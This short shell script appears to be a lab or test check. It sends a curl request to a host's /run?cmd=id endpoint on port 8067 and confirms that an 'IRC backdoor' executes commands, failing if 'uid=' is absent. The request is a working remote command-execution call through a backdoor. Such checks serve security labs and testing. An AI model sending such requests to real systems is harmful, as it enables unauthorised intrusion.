set -eu
out=$(curl -fsS "http://${BOX_HOST}:8067/run?cmd=id")
echo "$out"
echo "$out" | grep -q 'uid=' || { echo "IRC backdoor did not execute" >&2; exit 1; }
